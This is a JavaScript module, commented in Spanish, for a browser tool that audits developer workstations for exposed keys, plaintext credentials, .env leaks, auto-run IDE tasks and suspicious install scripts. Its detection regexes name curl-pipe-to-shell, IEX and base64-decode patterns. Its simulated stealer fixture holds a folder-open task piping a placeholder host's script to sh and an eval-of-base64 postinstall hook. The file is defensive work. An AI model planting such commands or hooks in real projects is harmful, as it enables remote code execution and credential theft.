/**
 * Inspector local en RAM para postura de estación de trabajo de desarrollador (Zero-Retention).
 *
 * Reglas de seguridad y privacidad:
 * 1. Opera 100 % en memoria del cliente (File / FileSystemDirectoryHandle / texto pegado).
 * 2. Jamás almacena, retorna ni transmite valores de secretos, tokens ni cuerpos de llaves privadas.
 * 3. Ignora directorios pesados o binarios (`node_modules`, `.git/objects`, `target`, `dist`, `build`, `.venv`).
 * 4. Reporta honestamente `UNVERIFIED` cuando una fuente (p. ej. `~/.ssh`) no estuvo incluida en la selección,
 *    evitando falsos `PASS`.
 */

const IGNORED_DIRS = new Set([
  'node_modules',
  'bower_components',
  'target',
  'dist',
  'build',
  'out',
  '.next',
  '.nuxt',
  '.venv',
  'venv',
  '__pycache__',
  '.pytest_cache',
  '.gradle',
  '.idea',
  'vendor',
  'coverage',
]);

const MAX_FILES_SCANNED = 450;
const MAX_TEXT_BYTES = 256 * 1024;

export const SENSITIVE_ENV_NAMES = new Set([
  'GITHUB_TOKEN',
  'GH_TOKEN',
  'NPM_TOKEN',
  'PYPI_TOKEN',
  'AWS_SECRET_ACCESS_KEY',
  'AWS_SESSION_TOKEN',
  'OPENAI_API_KEY',
  'ANTHROPIC_API_KEY',
  'GEMINI_API_KEY',
  'OMEGA_API_TOKEN',
  'STRIPE_SECRET_KEY',
  'SUPABASE_SERVICE_ROLE_KEY',
  'DATABASE_URL',
  'PRIVATE_KEY',
]);

const BACKEND_SYNCABLE_ENV_NAMES = new Set([
  'GITHUB_TOKEN',
  'GH_TOKEN',
  'NPM_TOKEN',
  'PYPI_TOKEN',
  'AWS_SECRET_ACCESS_KEY',
  'OPENAI_API_KEY',
  'ANTHROPIC_API_KEY',
  'OMEGA_API_TOKEN',
]);

const SUSPICIOUS_EXEC_PATTERNS = [
  { re: /\b(?:curl|wget|Invoke-WebRequest|iwr)\b[^\n|]*\|\s*(?:ba)?sh\b/i, label: 'Descarga directa canalizada a shell' },
  { re: /\b(?:powershell|pwsh)\b[^\n]*-(?:enc|encodedcommand)\b/i, label: 'PowerShell con comando codificado (-enc)' },
  { re: /\b(?:Invoke-Expression|IEX)\b/i, label: 'Ejecución dinámica Invoke-Expression (IEX)' },
  { re: /\bBuffer\.from\([^)]+,\s*['"]base64['"]\)/i, label: 'Decodificación Base64 en tiempo de instalación' },
  { re: /\bchild_process\b[^\n]*\b(?:exec|spawn|execSync)\b/i, label: 'Ejecución de subproceso en script de ciclo de vida' },
  { re: /\b(?:base64\s+-d|base64\s+--decode)\b/i, label: ' Tubería de decodificación Base64 en shell' },
  { re: /\b(?:curl|wget)\b[^\n]+https?:\/\/(?!(?:registry\.npmjs\.org|pypi\.org|github\.com)\b)/i, label: 'Descarga HTTP externa durante hook automático' },
];

export const BASE_WORKSTATION_CONTROLS = Object.freeze([
  {
    controlId: 'DEV-WS-01',
    title: 'Llaves privadas SSH y material criptográfico',
    target: '~/.ssh/ · *.pem · id_ed25519 · id_rsa',
    description: 'Detecta llaves privadas sin cifrar (cipher none / PKCS#1 plano) o llaves copiadas dentro de repositorios.',
    remediation: 'Protege tus llaves con passphrase (ssh-keygen -p), aplica permisos 600 / ACL exclusiva y nunca guardes llaves dentro de un repo.',
  },
  {
    controlId: 'DEV-WS-02',
    title: 'Credenciales en gestores de paquetes y nube',
    target: '.npmrc · .pypirc · .git-credentials · .aws/credentials · .docker/config.json',
    description: 'Comprueba tokens estáticos de publicación o autenticación en texto plano en archivos de configuración.',
    remediation: 'Usa OIDC Trusted Publishers en CI, tokens granulares de corta duración y credential helpers del sistema operativo.',
  },
  {
    controlId: 'DEV-WS-03',
    title: 'Configuración y hooks ejecutables de Git',
    target: '.gitconfig · .git/config · .git/hooks/*',
    description: 'Revisa credential.helper=store, URLs remotas con tokens embebidos, core.hooksPath externo y hooks sospechosos.',
    remediation: 'Configura credential.helper manager / osxkeychain / libsecret y audita .git/hooks antes de hacer commit o checkout.',
  },
  {
    controlId: 'DEV-WS-04',
    title: 'Variables sensibles y aislamiento en .gitignore',
    target: '.env* · perfiles de shell · .gitignore',
    description: 'Identifica nombres de llaves de producción (sin leer sus valores) y verifica que los archivos .env estén ignorados por Git.',
    remediation: 'Añade .env* a .gitignore, rota cualquier token que haya tocado un árbol sin ignorar e inyecta secretos por sesión.',
  },
  {
    controlId: 'DEV-WS-05',
    title: 'Auto-ejecución en IDE (.vscode / Cursor / Windsurf)',
    target: '.vscode/tasks.json · .vscode/settings.json',
    description: 'Detecta tareas con "runOn": "folderOpen" o perfiles de terminal alterados (vector clásico de robo de credenciales al abrir proyectos).',
    remediation: 'Elimina "runOn": "folderOpen" de repositorios de terceros y abre proyectos desconocidos en modo Restringido (Workspace Trust).',
  },
  {
    controlId: 'DEV-WS-06',
    title: 'Scripts de ciclo de vida y cadena de suministro local',
    target: 'package.json (preinstall / postinstall) · Makefile',
    description: 'Analiza hooks automáticos de instalación en busca de descargas remotas, código ofuscado en Base64 o ejecución silenciosa.',
    remediation: 'Ejecuta npm ci --ignore-scripts en repositorios no auditados y revisa cada script preinstall/postinstall.',
  },
]);

function isInspectableFilename(relPath) {
  const lower = relPath.toLowerCase();
  const base = lower.split('/').pop() || '';
  if (
    base === 'package.json' ||
    base === '.gitignore' ||
    base === '.gitconfig' ||
    base === 'config' ||
    base === '.git-credentials' ||
    base === '.npmrc' ||
    base === '.pypirc' ||
    base === '.netrc' ||
    base === 'credentials' ||
    base === 'config.json' ||
    base === 'tasks.json' ||
    base === 'settings.json' ||
    base === 'extensions.json' ||
    base === '.bashrc' ||
    base === '.zshrc' ||
    base === 'microsoft.powershell_profile.ps1' ||
    base.startsWith('.env') ||
    base.startsWith('id_rsa') ||
    base.startsWith('id_ed25519') ||
    base.startsWith('id_ecdsa') ||
    base.endsWith('.pem') ||
    base.endsWith('.key') ||
    base.endsWith('.ppk')
  ) {
    return true;
  }
  if (lower.includes('.git/hooks/') && !base.endsWith('.sample')) {
    return true;
  }
  return false;
}

function inspectOpenSshUnencrypted(content) {
  if (content.includes('-----BEGIN RSA PRIVATE KEY-----') || content.includes('-----BEGIN EC PRIVATE KEY-----')) {
    return !content.includes('Proc-Type: 4,ENCRYPTED');
  }
  if (content.includes('-----BEGIN PRIVATE KEY-----')) {
    return true; // PKCS#8 unencrypted (encrypted uses BEGIN ENCRYPTED PRIVATE KEY)
  }
  if (content.includes('-----BEGIN OPENSSH PRIVATE KEY-----')) {
    const body = content
      .replace(/-----BEGIN OPENSSH PRIVATE KEY-----/g, '')
      .replace(/-----END OPENSSH PRIVATE KEY-----/g, '')
      .replace(/\s+/g, '');
    try {
      const bin = atob(body.slice(0, 160));
      // OpenSSH key v1 header lists ciphername right after "openssh-key-v1\0"
      return bin.includes('openssh-key-v1') && bin.includes('none');
    } catch {
      return false;
    }
  }
  return false;
}

function parseEnvVarNames(content) {
  const found = [];
  const lines = content.split(/\r?\n/);
  for (const rawLine of lines) {
    const line = rawLine.trim();
    if (!line || line.startsWith('#')) continue;
    const match = line.match(/^(?:export\s+|\$env:)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\S+)/);
    if (!match) continue;
    const varName = match[1].toUpperCase();
    const rhs = match[2].replace(/^['"]|['"]$/g, '').trim();
    if (!rhs || rhs === 'changeme' || rhs.startsWith('your_') || rhs.startsWith('<')) continue;
    if (
      SENSITIVE_ENV_NAMES.has(varName) ||
      /(?:_TOKEN|_SECRET|_API_KEY|_PRIVATE_KEY)$/.test(varName)
    ) {
      if (!found.includes(varName)) found.push(varName);
    }
  }
  return found;
}

function gitignoreCoversEnv(gitignoreText) {
  if (!gitignoreText) return false;
  return gitignoreText
    .split(/\r?\n/)
    .map((l) => l.trim())
    .some((l) => !l.startsWith('#') && (l === '.env' || l === '.env*' || l === '.env.*' || l === '*.env'));
}

/**
 * Ejecuta la inspección determinista sobre una lista de entradas en memoria:
 * `entries`: Array<{ path: string, content: string, size?: number }>
 * `options`: { scopeLabel?: string, includesHomeSsh?: boolean }
 */
export function analyzeWorkstationEntries(entries = [], options = {}) {
  const sshFindings = [];
  const pkgCredFindings = [];
  const gitFindings = [];
  const envFindings = [];
  const ideFindings = [];
  const scriptFindings = [];

  const detectedEnvNames = new Set();
  const envFilesWithSecrets = [];
  let sawGitignore = false;
  let envIgnoredByGit = false;
  let sawSshMaterial = Boolean(options.includesHomeSsh);
  let sawGitMaterial = false;
  let sawPackageJson = false;
  let sawVscodeDir = false;

  for (const item of entries) {
    const relPath = String(item?.path || '').replace(/\\/g, '/').replace(/^\/+/, '');
    const lower = relPath.toLowerCase();
    const base = lower.split('/').pop() || '';
    const content = typeof item?.content === 'string' ? item.content : '';

    if (base === '.gitignore') {
      sawGitignore = true;
      if (gitignoreCoversEnv(content)) envIgnoredByGit = true;
    }

    // DEV-WS-01: SSH / Private keys
    const isPrivateKeyHeader = /-----BEGIN (?:OPENSSH |RSA |EC |DSA |ENCRYPTED )?PRIVATE KEY-----/.test(content);
    const isSshKeyName =
      lower.includes('.ssh/') ||
      /^id_(?:rsa|ed25519|ecdsa|dsa)$/.test(base) ||
      base.endsWith('.ppk');
    if (isPrivateKeyHeader || isSshKeyName) {
      sawSshMaterial = true;
      const inRepoTree = !lower.startsWith('.ssh/') && !lower.includes('/.ssh/');
      const unencrypted = isPrivateKeyHeader && inspectOpenSshUnencrypted(content);
      if (inRepoTree && isPrivateKeyHeader) {
        sshFindings.push({
          severity: 'CRITICAL',
          path: relPath,
          detail: unencrypted
            ? 'Llave privada sin cifrar encontrada dentro del árbol del proyecto.'
            : 'Archivo de llave privada ubicado dentro del árbol del proyecto.',
        });
      } else if (unencrypted) {
        sshFindings.push({
          severity: 'HIGH',
          path: relPath,
          detail: 'Llave privada almacenada en disco sin passphrase (cifrado "none" / texto plano).',
        });
      }
    }

    // DEV-WS-02: Package manager & cloud credentials
    if (base === '.npmrc' && /(?:_authToken|_auth|password)\s*=/i.test(content)) {
      pkgCredFindings.push({
        severity: 'HIGH',
        path: relPath,
        detail: 'Token de autenticación npm (_authToken / _auth) almacenado en texto plano.',
      });
    } else if (base === '.pypirc' && /\bpassword\s*=\s*\S+/i.test(content)) {
      pkgCredFindings.push({
        severity: 'HIGH',
        path: relPath,
        detail: 'Credencial de publicación PyPI presente en .pypirc.',
      });
    } else if (base === '.git-credentials' && /https?:\/\/[^/\s]+:[^@\s]+@/i.test(content)) {
      pkgCredFindings.push({
        severity: 'CRITICAL',
        path: relPath,
        detail: 'Credenciales Git almacenadas en texto plano en .git-credentials.',
      });
    } else if (lower.endsWith('.aws/credentials') && /aws_secret_access_key\s*=/i.test(content)) {
      pkgCredFindings.push({
        severity: 'HIGH',
        path: relPath,
        detail: 'Llave estática AWS (aws_secret_access_key) en archivo local de credenciales.',
      });
    } else if (lower.endsWith('.docker/config.json') && /"auth"\s*:\s*"[A-Za-z0-9+/=]{8,}"/.test(content) && !/"credsStore"\s*:/.test(content)) {
      pkgCredFindings.push({
        severity: 'MEDIUM',
        path: relPath,
        detail: 'Autenticación Docker en Base64 sin gestor cifrado (credsStore).',
      });
    }

    // DEV-WS-03: Git config & hooks
    if (base === '.gitconfig' || lower.endsWith('.git/config')) {
      sawGitMaterial = true;
      if (/helper\s*=\s*store\b/i.test(content)) {
        gitFindings.push({
          severity: 'HIGH',
          path: relPath,
          detail: 'credential.helper=store guarda contraseñas y PATs sin cifrar en disco.',
        });
      }
      if (/url\s*=\s*https?:\/\/[^/\s:@]+:[^@\s]+@/i.test(content)) {
        gitFindings.push({
          severity: 'CRITICAL',
          path: relPath,
          detail: 'URL remota de Git contiene credenciales o token embebido directamente.',
        });
      }
      if (/hooksPath\s*=\s*\S+/i.test(content)) {
        gitFindings.push({
          severity: 'MEDIUM',
          path: relPath,
          detail: 'core.hooksPath redirige la ejecución de hooks de Git a una ruta personalizada.',
        });
      }
      if (/fsmonitor\s*=\s*(?!true\b|false\b)\S+/i.test(content)) {
        gitFindings.push({
          severity: 'HIGH',
          path: relPath,
          detail: 'core.fsmonitor ejecuta un comando arbitrario en cada operación de Git.',
        });
      }
    }
    if (lower.includes('.git/hooks/') && !base.endsWith('.sample')) {
      sawGitMaterial = true;
      for (const pat of SUSPICIOUS_EXEC_PATTERNS) {
        if (pat.re.test(content)) {
          gitFindings.push({
            severity: 'CRITICAL',
            path: relPath,
            detail: `Hook ejecutable (${base}): ${pat.label}.`,
          });
          break;
        }
      }
    }

    // DEV-WS-04: .env & shell profiles
    if (
      base.startsWith('.env') &&
      base !== '.env.example' &&
      base !== '.env.sample' &&
      base !== '.env.template'
    ) {
      const names = parseEnvVarNames(content);
      if (names.length > 0) {
        names.forEach((n) => detectedEnvNames.add(n));
        envFilesWithSecrets.push({ path: relPath, names });
      }
    } else if (
      base === '.bashrc' ||
      base === '.zshrc' ||
      base === 'microsoft.powershell_profile.ps1'
    ) {
      const names = parseEnvVarNames(content);
      if (names.length > 0) {
        names.forEach((n) => detectedEnvNames.add(n));
        envFindings.push({
          severity: 'MEDIUM',
          path: relPath,
          detail: `Tokens exportados globalmente en perfil de shell (${names.join(', ')}).`,
        });
      }
    }

    // DEV-WS-05: .vscode / Cursor / Windsurf tasks & settings
    if (lower.endsWith('.vscode/tasks.json') || (base === 'tasks.json' && content.includes('"tasks"'))) {
      sawVscodeDir = true;
      if (/"runOn"\s*:\s*"folderOpen"/i.test(content)) {
        ideFindings.push({
          severity: 'CRITICAL',
          path: relPath,
          detail: 'Tarea configurada con "runOn": "folderOpen": ejecuta código automáticamente al abrir la carpeta en VS Code / Cursor.',
        });
      }
      for (const pat of SUSPICIOUS_EXEC_PATTERNS) {
        if (pat.re.test(content)) {
          ideFindings.push({
            severity: 'CRITICAL',
            path: relPath,
            detail: `Comando sospechoso en tasks.json: ${pat.label}.`,
          });
          break;
        }
      }
    }
    if (lower.endsWith('.vscode/settings.json') || (base === 'settings.json' && content.includes('terminal.integrated'))) {
      sawVscodeDir = true;
      if (/"terminal\.integrated\.(?:shellArgs|profiles|env)\./i.test(content)) {
        ideFindings.push({
          severity: 'HIGH',
          path: relPath,
          detail: 'settings.json modifica perfiles o variables de la terminal integrada del IDE.',
        });
      }
    }

    // DEV-WS-06: package.json lifecycle hooks
    if (base === 'package.json') {
      sawPackageJson = true;
      try {
        const pkg = JSON.parse(content);
        const scripts = pkg?.scripts && typeof pkg.scripts === 'object' ? pkg.scripts : {};
        for (const hookName of ['preinstall', 'install', 'postinstall', 'prepare']) {
          const cmd = typeof scripts[hookName] === 'string' ? scripts[hookName] : '';
          if (!cmd) continue;
          const matched = SUSPICIOUS_EXEC_PATTERNS.find((pat) => pat.re.test(cmd));
          if (matched) {
            scriptFindings.push({
              severity: 'CRITICAL',
              path: relPath,
              detail: `Script "${hookName}": ${matched.label}.`,
            });
          } else if (/\b(?:node|python|python3|sh|bash|powershell|cmd)\b/i.test(cmd) && (hookName === 'preinstall' || hookName === 'postinstall')) {
            scriptFindings.push({
              severity: 'MEDIUM',
              path: relPath,
              detail: `Script automático "${hookName}" ejecuta un intérprete (${cmd.slice(0, 80)}${cmd.length > 80 ? '…' : ''}). Verifica su legitimidad.`,
            });
          }
        }
      } catch {
        // Ignore malformed JSON
      }
    }
  }

  for (const item of envFilesWithSecrets) {
    if (sawGitignore && !envIgnoredByGit) {
      envFindings.push({
        severity: 'CRITICAL',
        path: item.path,
        detail: `Contiene variables sensibles (${item.names.join(', ')}) y .gitignore NO excluye archivos .env.`,
      });
    } else {
      envFindings.push({
        severity: 'MEDIUM',
        path: item.path,
        detail: `Variables sensibles detectadas en disco (${item.names.join(', ')}) — verifica que no sean tokens permanentes de producción.`,
      });
    }
  }

  function buildControl(baseMeta, findings, verifiedCondition, unverifiedReason) {
    if (findings.length > 0) {
      const topSeverity = findings.some((f) => f.severity === 'CRITICAL')
        ? 'CRITICAL'
        : findings.some((f) => f.severity === 'HIGH')
          ? 'HIGH'
          : 'MEDIUM';
      return {
        ...baseMeta,
        status: 'WARN',
        severity: topSeverity,
        findings,
        summary: findings.map((f) => `${f.path}: ${f.detail}`).join(' · '),
      };
    }
    if (!verifiedCondition) {
      return {
        ...baseMeta,
        status: 'UNVERIFIED',
        severity: 'INFO',
        findings: [],
        summary: unverifiedReason,
      };
    }
    return {
      ...baseMeta,
      status: 'PASS',
      severity: 'LOW',
      findings: [],
      summary: 'Sin exposiciones detectadas en los archivos inspeccionados en memoria.',
    };
  }

  const hasAnyFiles = entries.length > 0;
  const controls = [
    buildControl(
      BASE_WORKSTATION_CONTROLS[0],
      sshFindings,
      sawSshMaterial,
      'No se incluyó ~/.ssh ni archivos de llaves en la selección actual (evitamos marcar PASS sin evidencia).',
    ),
    buildControl(
      BASE_WORKSTATION_CONTROLS[1],
      pkgCredFindings,
      hasAnyFiles,
      'Selecciona una carpeta o archivo de configuración para comprobar credenciales en disco.',
    ),
    buildControl(
      BASE_WORKSTATION_CONTROLS[2],
      gitFindings,
      sawGitMaterial,
      'No se encontró .gitconfig ni carpeta .git en la selección actual.',
    ),
    buildControl(
      BASE_WORKSTATION_CONTROLS[3],
      envFindings,
      hasAnyFiles,
      'Selecciona un proyecto o archivo .env para auditar variables y reglas de .gitignore.',
    ),
    buildControl(
      BASE_WORKSTATION_CONTROLS[4],
      ideFindings,
      sawVscodeDir || hasAnyFiles,
      'Sin carpeta .vscode en la selección.',
    ),
    buildControl(
      BASE_WORKSTATION_CONTROLS[5],
      scriptFindings,
      sawPackageJson,
      'No se encontró package.json en la selección actual.',
    ),
  ];

  const warningsCount = controls.filter((c) => c.status === 'WARN').length;
  const criticalCount = controls.filter((c) => c.severity === 'CRITICAL').length;
  const verifiedCount = controls.filter((c) => c.status !== 'UNVERIFIED').length;

  const backendSyncPayload = {
    consentConfirmed: true,
    inspectLocalHostMetadata: false,
    sshKeyPermissiveAcl: sshFindings.length > 0,
    plaintextPackageManagerRc: pkgCredFindings.length > 0,
    gitCredentialHelperPlaintext: gitFindings.length > 0,
    exposedSensitiveEnvNames: Array.from(detectedEnvNames).filter((n) =>
      BACKEND_SYNCABLE_ENV_NAMES.has(n),
    ),
  };

  return {
    overallStatus: criticalCount > 0 ? 'CRITICAL' : warningsCount > 0 ? 'WARN' : 'PASS',
    auditedAt: new Date().toISOString(),
    scopeLabel: options.scopeLabel || `${entries.length} archivo(s) inspeccionados en RAM`,
    filesInspected: entries.length,
    controlsEvaluated: controls.length,
    verifiedCount,
    warningsCount,
    criticalCount,
    controls,
    backendSyncPayload,
    zeroRetentionNotice:
      'Inspección ejecutada 100 % en la RAM de tu navegador: ningún contenido de archivo, token ni llave privada salió de tu equipo.',
  };
}

/**
 * Recorre recursivamente un `FileSystemDirectoryHandle` (File System Access API)
 * extrayendo en RAM únicamente archivos de configuración/manifiestos relevantes.
 */
export async function collectEntriesFromDirectoryHandle(dirHandle) {
  const entries = [];
  let visited = 0;

  async function walk(handle, prefix = '', depth = 0) {
    if (depth > 5 || entries.length >= MAX_FILES_SCANNED || visited > 4000) return;
    for await (const [name, child] of handle.entries()) {
      visited += 1;
      if (entries.length >= MAX_FILES_SCANNED || visited > 4000) break;
      const relPath = prefix ? `${prefix}/${name}` : name;
      if (child.kind === 'directory') {
        if (IGNORED_DIRS.has(name.toLowerCase())) continue;
        if (name === 'objects' && prefix.endsWith('.git')) continue;
        await walk(child, relPath, depth + 1);
      } else if (child.kind === 'file') {
        if (!isInspectableFilename(relPath)) continue;
        try {
          const file = await child.getFile();
          if (file.size > MAX_TEXT_BYTES) continue;
          const content = await file.text();
          entries.push({ path: relPath, content, size: file.size });
        } catch {
          // Ignore unreadable locked OS files
        }
      }
    }
  }

  await walk(dirHandle, '', 0);
  return entries;
}

/**
 * Convierte una lista de objetos `File` (input file/webkitdirectory o drag & drop)
 * en entradas en memoria filtrando directorios pesados y archivos grandes.
 */
export async function collectEntriesFromFileList(fileList) {
  const entries = [];
  const files = Array.from(fileList || []);
  for (const file of files) {
    if (entries.length >= MAX_FILES_SCANNED) break;
    const rawPath = (file.webkitRelativePath || file.name || '').replace(/\\/g, '/');
    const segments = rawPath.split('/');
    if (segments.some((seg) => IGNORED_DIRS.has(seg.toLowerCase()))) continue;
    if (rawPath.includes('.git/objects/')) continue;
    if (!isInspectableFilename(rawPath) && files.length > 15) continue;
    if (file.size > MAX_TEXT_BYTES) continue;
    try {
      const content = await file.text();
      entries.push({ path: rawPath, content, size: file.size });
    } catch {
      // Ignore unreadable files
    }
  }
  return entries;
}

/**
 * Escenario realista de simulación (vectores Contagious Interview / Stealer de repositorios)
 * para demostrar y verificar las detecciones sin tocar archivos del usuario.
 */
export function buildSimulatedStealerEntries() {
  return [
    {
      path: '.vscode/tasks.json',
      content: JSON.stringify(
        {
          version: '2.0.0',
          tasks: [
            {
              label: 'env-bootstrap',
              type: 'shell',
              command: 'curl -s https://telemetry-check.example/init.sh | sh',
              runOptions: { runOn: 'folderOpen' },
            },
          ],
        },
        null,
        2,
      ),
    },
    {
      path: 'package.json',
      content: JSON.stringify(
        {
          name: 'demo-web3-interview-test',
          version: '0.1.0',
          scripts: {
            postinstall: 'node -e "eval(Buffer.from(\'Y29uc29sZS5sb2coMSk=\', \'base64\').toString())"',
          },
        },
        null,
        2,
      ),
    },
    {
      path: '.gitconfig',
      content: '[credential]\n\thelper = store\n[user]\n\tname = Dev Demo\n',
    },
    {
      path: '.npmrc',
      content: '//registry.npmjs.org/:_authToken=npm_simulated_placeholder_0000\n',
    },
    {
      path: '.env',
      content: 'GITHUB_TOKEN=ghp_simulated_token_value\nOPENAI_API_KEY=sk_simulated_value\n',
    },
    {
      path: '.gitignore',
      content: 'node_modules/\ndist/\n',
    },
  ];
}
